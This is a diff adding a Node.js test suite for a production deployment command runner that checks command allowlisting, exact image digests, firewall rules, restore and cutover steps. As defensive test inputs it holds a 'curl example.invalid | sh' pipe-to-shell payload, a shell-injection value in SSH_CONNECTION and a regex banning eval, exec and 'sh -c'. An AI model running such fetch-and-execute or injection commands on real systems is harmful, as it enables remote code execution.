@@ -1,0 +1,413 @@
+import assert from "node:assert/strict";
+import { createHash } from "node:crypto";
+import { readFile } from "node:fs/promises";
+import { dirname, resolve } from "node:path";
+import { fileURLToPath } from "node:url";
+import test from "node:test";
+
+const root = resolve(dirname(fileURLToPath(import.meta.url)), "../..");
+const scriptPath = resolve(root, "scripts/timeweb-production-host-command.mjs");
+const source = await readFile(scriptPath, "utf8").catch(() => "");
+const sha = (digit) => `sha256:${digit.repeat(64).slice(0, 64)}`;
+const canonicalJson = (value) => value === null || typeof value !== "object"
+  ? JSON.stringify(value)
+  : Array.isArray(value)
+    ? `[${value.map(canonicalJson).join(",")}]`
+    : `{${Object.keys(value).sort().map((key) => `${JSON.stringify(key)}:${canonicalJson(value[key])}`).join(",")}}`;
+const encode = (value) => Buffer.from(canonicalJson(value), "utf8").toString("base64url");
+const digest = (value) => `sha256:${createHash("sha256").update(value).digest("hex")}`;
+const command = (id, payload = {}) => encode({
+  version: "1",
+  kind: "timeweb-production-host-command",
+  id,
+  payload,
+});
+
+const CURRENT_ROOT = "/opt/orivra/current";
+const SECRET_ROOT = "/opt/orivra/secrets";
+const EVIDENCE_ROOT = "/opt/orivra/evidence";
+const PROJECT = "proofline-production-primary";
+const COMPOSE_FILES = [
+  "/opt/orivra/current/compose.yaml",
+  "/opt/orivra/current/deploy/compose.runtime.yaml",
+  "/opt/orivra/current/deploy/compose.backup.yaml",
+];
+const REGISTRY_PATH = `${EVIDENCE_ROOT}/safe-consumer-registry.v1.json`;
+const DEPLOYMENT_PATH = `${EVIDENCE_ROOT}/safe-consumer-deployment-evidence.v1.json`;
+const GHCR_TOKEN_PATH = `${SECRET_ROOT}/ghcr-pull-token`;
+const PUBLIC_ORIGIN = "https://orivra.xyz";
+const OPEN_METEO = "sha256:18cd4d6b5c2d8e84ca0d2004c5a013f7f9c9387eed0d1de23ce00df8f167c4e8";
+const ETH_USD = "sha256:7aed4a243cb1cdc23a4faf2cbd687c3effb97805cb4f0ca44a666b385cd2b2db";
+const RUN_IDS = [
+  "run_01K2Q4P6R8T0V2X4Z6B8D0F2H4",
+  "run_01K2Q4P6R8T0V2X4Z6B8D0F2H5",
+];
+const images = [
+  ["caddy", "ghcr.io/marshersusanin/orivra-caddy", "a"],
+  ["web", "ghcr.io/marshersusanin/orivra-web", "b"],
+  ["api", "ghcr.io/marshersusanin/orivra-api", "c"],
+  ["worker", "ghcr.io/marshersusanin/orivra-worker", "d"],
+  ["postgres-recovery", "ghcr.io/marshersusanin/orivra-postgres-recovery", "e"],
+].map(([id, remoteRepository, digit]) => ({
+  id,
+  remoteRepository,
+  remoteDigest: sha(digit),
+  remoteReference: `${remoteRepository}@${sha(digit)}`,
+}));
+const imageEnvironment = {
+  PROOFLINE_CADDY_IMAGE: images[0].remoteReference,
+  PROOFLINE_WEB_IMAGE: images[1].remoteReference,
+  PROOFLINE_API_IMAGE: images[2].remoteReference,
+  PROOFLINE_WORKER_IMAGE: images[3].remoteReference,
+  PROOFLINE_POSTGRES_IMAGE: images[4].remoteReference,
+};
+const publication = JSON.parse(await readFile(
+  resolve(root, "tests/fixtures/slice029b-publication-evidence.v1.json"), "utf8",
+));
+const publicationBytes = Buffer.from(canonicalJson(publication), "utf8");
+const objectStore = {
+  version: "1", kind: "timeweb-s3-pilot-authority", provider: "timeweb-s3",
+  endpoint: "https://s3.twcstorage.ru", region: "ru-1", bucket: "orivra-backet",
+  pathStyle: true, authorityMode: "shared-pilot", credentialDelivery: "secret-files",
+  qaProvider: "minio-only", swiftRuntime: false,
+};
+const target = {
+  version: "2", kind: "digitalocean-production-target", provider: "digitalocean", environment: "production",
+  deploymentMode: "direct-pilot", deploymentId: "orivra-production-primary", composeProject: PROJECT,
+  publicOrigin: PUBLIC_ORIGIN, dnsName: "orivra.xyz",
+  sshEndpoint: { host: "72.56.81.28", port: 22, hostKeySha256: sha("1") },
+  ingress: [80, 443], objectStore,
+};
+const safeConsumers = {
+  version: "1", kind: "safe-consumer-registry", chainId: 114,
+  entries: [
+    { templateId: "open-meteo-current-weather", revision: 1, manifestSha256: OPEN_METEO, consumerAddress: "0x1111111111111111111111111111111111111111" },
+    { templateId: "eth-usd", revision: 1, manifestSha256: ETH_USD, consumerAddress: "0x2222222222222222222222222222222222222222" },
+  ],
+};
+const productionEvidence = {
+  version: "2", kind: "digitalocean-production-deployment-evidence",
+  status: "passed", verification: "verified", productionClaim: true,
+  producer: publication.producer,
+  publicationEvidenceSha256: digest(publicationBytes),
+  frozenReleaseManifestSha256: publication.frozenRelease.frozenReleaseManifestSha256,
+  promotionAuthorizationSha256: sha("6"), preflightEvidenceSha256: sha("7"), target,
+  run: { runId: "prod_01K2Q4P6R8T0V2X4Z6B8D0F2H4", operatorId: "operator_01K2Q4P6R8T0V2X4Z6B8D0F2H4", completedAt: "2026-08-12T03:00:01Z" },
+  pullCredential: { registry: "ghcr.io", access: "read-only" },
+  images,
+  topology: { publicService: "caddy", publicPorts: [80, 443], privateServices: ["web", "api", "worker", "postgres"], forbiddenPublicPorts: [5432, 8080], dockerSocketMounted: false },
+  database: { migrationManifestSha256: sha("8"), targetVersion: 10, schemaVersion: 10, roleBootstrap: { status: "passed" }, migration: { status: "passed" } },
+  objectStore, safeConsumers,
+  checks: {
+    exactDigestPull: { status: "passed" }, readyz: { status: "passed" }, workerHeartbeat: { status: "current" },
+    timewebPitr: { status: "passed", restoreEvidenceSha256: sha("9"), backupAgeSeconds: 60, archivePendingAgeSeconds: 30 },
+    liveCoston2: { status: "persisted", runIds: RUN_IDS, manifests: [OPEN_METEO, ETH_USD] },
+  },
+  cutover: { status: "passed", publicOrigin: PUBLIC_ORIGIN, activatedAt: "2026-08-12T03:00:00Z" },
+};
+const canaryCheckpoint = {
+  version: "2", kind: "production-canary-checkpoint", id: "post-cutover-15m",
+  dueAt: "2026-08-12T03:15:00Z", observedAt: "2026-08-12T03:15:00Z", status: "passed",
+  checks: {
+    healthz: { status: "passed" }, readyz: { status: "passed" }, workerHeartbeat: { status: "current" },
+    objectStore: { status: "passed", backupAgeSeconds: 60, archivePendingAgeSeconds: 30 },
+    diskPressure: { status: "passed" }, hostedBrowserSmoke: { status: "passed" },
+    liveCoston2: { status: "persisted", runIds: RUN_IDS },
+    clock: { status: "synchronized", source: "production-host", maximumSkewSeconds: 5, observedSkewSeconds: 0 },
+  },
+};
+
+const ALLOWED_IDS = [
+  "configure-firewall",
+  "pull-exact-digests",
+  "inspect-local-digests",
+  "postgres",
+  "db-role-bootstrap",
+  "migrator",
+  "start-api",
+  "safe-consumer-deployer",
+  "write-safe-consumer-registry",
+  "start-worker",
+  "start-web",
+  "start-caddy-candidate",
+  "readyz-real-heartbeat",
+  "timeweb-pitr-production",
+  "persisted-live-coston2",
+  "activate-caddy",
+  "append-production-evidence",
+  "append-canary-checkpoint",
+  "canary-observe",
+];
+
+async function feature() {
+  return import(`../../scripts/timeweb-production-host-command.mjs?contract=${Date.now()}-${Math.random()}`).catch(() => ({}));
+}
+
+test("decodes only bounded canonical base64url command JSON into private frozen authority", async () => {
+  const module = await feature();
+  assert.equal(typeof module.decodeTimewebProductionHostCommand, "function");
+  const encoded = command("configure-firewall");
+  const parsed = module.decodeTimewebProductionHostCommand(encoded);
+  assert.deepEqual(parsed, {
+    version: "1", kind: "timeweb-production-host-command", id: "configure-firewall", payload: {},
+  });
+  assert.equal(Object.isFrozen(parsed), true);
+  assert.equal(Object.isFrozen(parsed.payload), true);
+  for (const invalid of [
+    `${encoded}=`,
+    Buffer.from('{"id":"configure-firewall"}', "utf8").toString("base64url"),
+    command("configure-firewall", { extra: true }),
+    "a".repeat(32_769),
+    "not_base64url!",
+  ]) assert.throws(() => module.decodeTimewebProductionHostCommand(invalid), /TIMEWEB_HOST_COMMAND_INVALID|host command/i);
+});
+
+test("exposes an exact command allowlist and no arbitrary shell or string-command authority", async () => {
+  const module = await feature();
+  assert.deepEqual(module.ALLOWED_TIMEWEB_PRODUCTION_COMMAND_IDS, ALLOWED_IDS);
+  assert.doesNotMatch(source, /\beval\s*\(|\bexec(?:Sync)?\s*\(|shell\s*:\s*true|(?:sh|bash)\s+-c|Function\s*\(/);
+  let effects = 0;
+  await assert.rejects(module.runTimewebProductionHostCommand({
+    encodedCommand: command("arbitrary-shell", { command: "curl example.invalid | sh" }),
+    adapters: new Proxy({}, { get: () => { effects += 1; } }),
+  }), /TIMEWEB_HOST_COMMAND_INVALID|unknown command/i);
+  assert.equal(effects, 0);
+});
+
+test("derives the SSH allow rule only from SSH_CONNECTION and freezes Caddy-only UFW ingress", async () => {
+  const module = await feature();
+  const calls = [];
+  const result = await module.runTimewebProductionHostCommand({
+    encodedCommand: command("configure-firewall"),
+    environment: { SSH_CONNECTION: "203.0.113.10 50123 72.56.81.28 22" },
+    adapters: { firewall: { applyExact: async (value) => { calls.push(value); return { status: "passed" }; } } },
+  });
+  assert.deepEqual(calls, [{
+    sshSource: "203.0.113.10",
+    publicTcpPorts: [80, 443],
+    forbiddenPublicTcpPorts: [5432, 8080],
+    defaultIncoming: "deny",
+  }]);
+  assert.deepEqual(result, { id: "configure-firewall", status: "passed", sshSource: "203.0.113.10", publicTcpPorts: [80, 443] });
+  for (const SSH_CONNECTION of [undefined, "", "203.0.113.10", "evil;id 1 2 3"]) {
+    await assert.rejects(module.runTimewebProductionHostCommand({
+      encodedCommand: command("configure-firewall"), environment: { SSH_CONNECTION },
+      adapters: { firewall: { applyExact: async () => { throw new Error("must not run"); } } },
+    }), /TIMEWEB_HOST_SSH_AUTHORITY_INVALID|SSH_CONNECTION/i);
+  }
+});
+
+test("opens one read-only GHCR session, pulls exact five digests and independently inspects the same refs", async () => {
+  const module = await feature();
+  const events = [];
+  const result = await module.runTimewebProductionHostCommand({
+    encodedCommand: command("pull-exact-digests", { images }),
+    adapters: { registry: {
+      openReadOnly: async (input) => { events.push(["open", input]); return {
+        pull: async (references) => events.push(["pull", references]),
+        inspect: async (references) => { events.push(["inspect", references]); return images.map(({ id, remoteDigest }) => ({ id, remoteDigest })); },
+        close: async () => events.push(["close"]),
+      }; },
+    } },
+  });
+  assert.deepEqual(events, [
+    ["open", { registry: "ghcr.io", tokenFile: GHCR_TOKEN_PATH, access: "read-only" }],
+    ["pull", images.map(({ remoteReference }) => remoteReference)],
+    ["inspect", images.map(({ remoteReference }) => remoteReference)],
+    ["close"],
+  ]);
+  assert.deepEqual(result, { id: "pull-exact-digests", status: "passed", images: images.map(({ id, remoteDigest }) => ({ id, remoteDigest })) });
+  for (const invalid of [
+    images.map((image, index) => index ? image : { ...image, remoteReference: `${image.remoteRepository}:latest` }),
+    images.map((image, index) => index ? image : { ...image, remoteRepository: "ghcr.io/evil/other", remoteReference: `ghcr.io/evil/other@${image.remoteDigest}` }),
+    [...images].reverse(),
+  ]) await assert.rejects(module.runTimewebProductionHostCommand({
+    encodedCommand: command("pull-exact-digests", { images: invalid }),
+    adapters: { registry: { openReadOnly: async () => { throw new Error("must not run"); } } },
+  }), /TIMEWEB_HOST_IMAGE_AUTHORITY_INVALID|image authority/i);
+});
+
+test("maps fixed database-first Compose phases without public Caddy cutover or caller-selected services", async () => {
+  const module = await feature();
+  const phases = [
+    ["postgres", ["postgres"]],
+    ["db-role-bootstrap", ["db-role-bootstrap"]],
+    ["migrator", ["migrator"]],
+    ["start-api", ["api"]],
+    ["start-worker", ["worker"]],
+    ["start-web", ["web"]],
+    ["start-caddy-candidate", ["caddy"]],
+  ];
+  const calls = [];
+  for (const [id, services] of phases) {
+    await module.runTimewebProductionHostCommand({
+      encodedCommand: command(id, { images }),
+      adapters: { compose: { runExactPhase: async (value) => { calls.push(value); return { status: "passed" }; } } },
+    });
+    assert.deepEqual(calls.at(-1), {
+      project: PROJECT, currentRoot: CURRENT_ROOT, composeFiles: COMPOSE_FILES,
+      phase: id, services, imageEnvironment, pullPolicy: "never",
+      publicIngress: id === "start-caddy-candidate" ? "candidate-disabled" : "unchanged",
+    });
+  }
+  assert.equal(calls.some(({ publicIngress }) => publicIngress === "active"), false);
+  await assert.rejects(module.runTimewebProductionHostCommand({
+    encodedCommand: command("start-api", { images, services: ["api", "worker"] }),
+    adapters: { compose: { runExactPhase: async () => { throw new Error("must not run"); } } },
+  }), /TIMEWEB_HOST_COMMAND_INVALID|services/i);
+});
+
+test("requires both safe-consumer outputs absent before deployer and a regular mode-0400 pair before worker", async () => {
+  const module = await feature();
+  const states = [
+    { deploymentEvidence: "absent", registry: "absent" },
+    { deploymentEvidence: { type: "regular", mode: 0o400 }, registry: { type: "regular", mode: 0o400 } },
+  ];
+  const calls = [];
+  const result = await module.runTimewebProductionHostCommand({
+    encodedCommand: command("safe-consumer-deployer", { images }),
+    adapters: {
+      evidence: { inspectSafeConsumerPair: async (input) => { calls.push(["inspect", input]); return states.shift(); } },
+      compose: { runExactPhase: async (input) => { calls.push(["compose", input]); return { status: "passed" }; } },
+    },
+  });
+  assert.deepEqual(calls.map(([id]) => id), ["inspect", "compose", "inspect"]);
+  assert.deepEqual(calls[0][1], { evidenceRoot: EVIDENCE_ROOT, deploymentEvidencePath: DEPLOYMENT_PATH, registryPath: REGISTRY_PATH });
+  assert.deepEqual(result, { id: "safe-consumer-deployer", status: "passed", deploymentEvidencePath: DEPLOYMENT_PATH, registryPath: REGISTRY_PATH, mode: 0o400 });
+  assert.deepEqual(await module.runTimewebProductionHostCommand({
+    encodedCommand: command("write-safe-consumer-registry"),
+    adapters: { evidence: { inspectSafeConsumerPair: async () => ({ deploymentEvidence: { type: "regular", mode: 0o400 }, registry: { type: "regular", mode: 0o400 } }) } },
+  }), { id: "write-safe-consumer-registry", status: "passed", deploymentEvidencePath: DEPLOYMENT_PATH, registryPath: REGISTRY_PATH, mode: 0o400 });
+  for (const invalidStates of [
+    [{ deploymentEvidence: "absent", registry: { type: "regular", mode: 0o400 } }],
+    [{ deploymentEvidence: "absent", registry: "absent" }, { deploymentEvidence: { type: "regular", mode: 0o600 }, registry: { type: "regular", mode: 0o400 } }],
+    [{ deploymentEvidence: "absent", registry: "absent" }, { deploymentEvidence: { type: "symlink", mode: 0o400 }, registry: { type: "regular", mode: 0o400 } }],
+  ]) await assert.rejects(module.runTimewebProductionHostCommand({
+    encodedCommand: command("safe-consumer-deployer", { images }),
+    adapters: {
+      evidence: { inspectSafeConsumerPair: async () => invalidStates.shift() },
+      compose: { runExactPhase: async () => ({ status: "passed" }) },
+    },
+  }), /TIMEWEB_HOST_SAFE_CONSUMER_EVIDENCE_INVALID|safe-consumer evidence/i);
+});
+
+test("accepts readiness only with current real heartbeat and exactly two persisted live Coston2 runs", async () => {
+  const module = await feature();
+  const ready = await module.runTimewebProductionHostCommand({
+    encodedCommand: command("readyz-real-heartbeat"),
+    adapters: { observe: { readyzHeartbeat: async () => ({ status: "passed", readyz: { status: "passed" }, workerHeartbeat: { status: "current", deploymentId: "orivra-production-primary" } }) } },
+  });
+  assert.equal(ready.workerHeartbeat.status, "current");
+  const live = await module.runTimewebProductionHostCommand({
+    encodedCommand: command("persisted-live-coston2"),
+    adapters: { observe: { persistedLiveCoston2: async () => ({ status: "passed", chainId: 114, runIds: RUN_IDS, manifests: [OPEN_METEO, ETH_USD], persisted: true }) } },
+  });
+  assert.deepEqual(live.runIds, RUN_IDS);
+  for (const observation of [
+    { status: "passed", readyz: { status: "passed" }, workerHeartbeat: { status: "stale" } },
+    { status: "passed", chainId: 114, runIds: RUN_IDS.slice(0, 1), manifests: [OPEN_METEO], persisted: true },
+  ]) await assert.rejects(module.runTimewebProductionHostCommand({
+    encodedCommand: command(observation.workerHeartbeat ? "readyz-real-heartbeat" : "persisted-live-coston2"),
+    adapters: { observe: { readyzHeartbeat: async () => observation, persistedLiveCoston2: async () => observation } },
+  }), /TIMEWEB_HOST_OBSERVATION_INVALID|observation/i);
+});
+
+test("runs Timeweb base backup plus PITR only into a fresh volume and returns strict restore evidence", async () => {
+  const module = await feature();
+  const calls = [];
+  const observation = {
+    status: "passed", provider: "timeweb-s3", endpoint: "https://s3.twcstorage.ru",
+    region: "ru-1", bucket: "orivra-backet", pathStyle: true,
+    baseBackupId: "base_20260812T030000Z", restoreVolumeId: "proofline-pitr-prod_01K2Q4P6R8T0V2X4Z6B8D0F2H4",
+    volumeWasFresh: true, restoreEvidenceSha256: sha("8"), backupAgeSeconds: 60,
+    archivePendingAgeSeconds: 30,
+  };
+  const result = await module.runTimewebProductionHostCommand({
+    encodedCommand: command("timeweb-pitr-production", { runId: "prod_01K2Q4P6R8T0V2X4Z6B8D0F2H4" }),
+    adapters: { pitr: { baseBackupAndRestore: async (input) => { calls.push(input); return observation; } } },
+  });
+  assert.deepEqual(calls, [{
+    endpoint: "https://s3.twcstorage.ru", region: "ru-1", bucket: "orivra-backet",
+    pathStyle: true, restoreVolumePolicy: "fresh-only", productionVolumeReuse: false,
+  }]);
+  assert.deepEqual(result, { id: "timeweb-pitr-production", ...observation });
+  await assert.rejects(module.runTimewebProductionHostCommand({
+    encodedCommand: command("timeweb-pitr-production", { runId: "prod_01K2Q4P6R8T0V2X4Z6B8D0F2H4" }),
+    adapters: { pitr: { baseBackupAndRestore: async () => ({ ...observation, volumeWasFresh: false }) } },
+  }), /TIMEWEB_HOST_PITR_INVALID|PITR observation/i);
+});
+
+test("keeps candidate Caddy private until one explicit activation and exact external HTTPS observation", async () => {
+  const module = await feature();
+  let activations = 0;
+  await module.runTimewebProductionHostCommand({
+    encodedCommand: command("start-caddy-candidate", { images }),
+    adapters: { compose: { runExactPhase: async ({ publicIngress }) => { assert.equal(publicIngress, "candidate-disabled"); return { status: "passed" }; } } },
+  });
+  assert.equal(activations, 0);
+  const result = await module.runTimewebProductionHostCommand({
+    encodedCommand: command("activate-caddy", { publicOrigin: PUBLIC_ORIGIN }),
+    adapters: { caddy: {
+      inspectCandidate: async () => ({ status: "staged", publicIngress: false }),
+      activate: async ({ publicOrigin }) => { activations += 1; return { status: "passed", publicOrigin, activatedAt: "2026-08-12T03:00:00Z" }; },
+      observeExternalHttps: async ({ publicOrigin }) => ({ status: "passed", publicOrigin, observedAt: "2026-08-12T03:00:01Z" }),
+    } },
+  });
+  assert.equal(activations, 1);
+  assert.deepEqual(result.cutover, { status: "passed", publicOrigin: PUBLIC_ORIGIN, activatedAt: "2026-08-12T03:00:00Z" });
+  await assert.rejects(module.runTimewebProductionHostCommand({
+    encodedCommand: command("activate-caddy", { publicOrigin: PUBLIC_ORIGIN }),
+    adapters: { caddy: { inspectCandidate: async () => ({ status: "missing" }), activate: async () => { throw new Error("must not run"); } } },
+  }), /TIMEWEB_HOST_CADDY_CANDIDATE_INVALID|Caddy candidate/i);
+});
+
+test("appends canonical evidence/checkpoints only to fixed mode-0400 no-replace paths", async () => {
+  const module = await feature();
+  const calls = [];
+  for (const [id, value, expectedPath] of [
+    ["append-production-evidence", productionEvidence, `${EVIDENCE_ROOT}/production-deployment-evidence.v2.json`],
+    ["append-canary-checkpoint", canaryCheckpoint, `${EVIDENCE_ROOT}/canary/01-post-cutover-15m.json`],
+  ]) {
+    const canonicalBytes = Buffer.from(canonicalJson(value), "utf8");
+    const result = await module.runTimewebProductionHostCommand({
+      encodedCommand: command(id, { canonicalBytesBase64url: canonicalBytes.toString("base64url"), sha256: digest(canonicalBytes) }),
+      adapters: { evidence: { appendNoReplace: async (entry) => { calls.push(entry); return { status: "passed", sha256: entry.sha256 }; } } },
+    });
+    assert.deepEqual(calls.at(-1), { path: expectedPath, bytes: canonicalBytes, sha256: digest(canonicalBytes), mode: 0o400, noReplace: true });
+    assert.equal(result.status, "passed");
+  }
+  const noncanonical = Buffer.from(JSON.stringify(productionEvidence, null, 2), "utf8");
+  await assert.rejects(module.runTimewebProductionHostCommand({
+    encodedCommand: command("append-production-evidence", { canonicalBytesBase64url: noncanonical.toString("base64url"), sha256: digest(noncanonical) }),
+    adapters: { evidence: { appendNoReplace: async () => { throw new Error("must not run"); } } },
+  }), /TIMEWEB_HOST_EVIDENCE_INVALID|canonical evidence/i);
+});
+
+test("validates typed canary observation and emits only bounded redacted CLI failure", async () => {
+  const module = await feature();
+  assert.deepEqual(await module.runTimewebProductionHostCommand({
+    encodedCommand: command("canary-observe", { id: canaryCheckpoint.id, dueAt: canaryCheckpoint.dueAt }),
+    adapters: { canary: { observe: async () => canaryCheckpoint } },
+  }), canaryCheckpoint);
+  await assert.rejects(module.runTimewebProductionHostCommand({
+    encodedCommand: command("canary-observe", { id: canaryCheckpoint.id, dueAt: canaryCheckpoint.dueAt }),
+    adapters: { canary: { observe: async () => ({ ...canaryCheckpoint, checks: { ...canaryCheckpoint.checks, workerHeartbeat: { status: "stale" } } }) } },
+  }), /TIMEWEB_HOST_CANARY_INVALID|canary observation/i);
+
+  assert.equal(typeof module.runTimewebProductionHostCommandCli, "function");
+  const stderr = [];
+  const stdout = [];
+  const encodedCommand = command("configure-firewall");
+  await assert.rejects(module.runTimewebProductionHostCommandCli({
+    argv: ["--command", encodedCommand],
+    environment: { SSH_CONNECTION: "203.0.113.10 50123 72.56.81.28 22", GH_TOKEN: "sentinel-secret" },
+    stdout: { write: (value) => stdout.push(String(value)) },
+    stderr: { write: (value) => stderr.push(String(value)) },
+    timeoutMs: 25_000,
+    runCommand: async () => { throw new Error("sentinel-secret from /opt/orivra/secrets/ghcr-pull-token"); },
+  }), /TIMEWEB_PRODUCTION_HOST_COMMAND_FAILED/);
+  assert.deepEqual(stdout, []);
+  assert.equal(stderr.join(""), `${canonicalJson({ status: "failed", code: "TIMEWEB_PRODUCTION_HOST_COMMAND_FAILED" })}\n`);
+  assert.doesNotMatch(stderr.join(""), /sentinel-secret|ghcr-pull-token|eyJ|private|token/i);
+  assert.match(source, /25_000|25000/);
+});
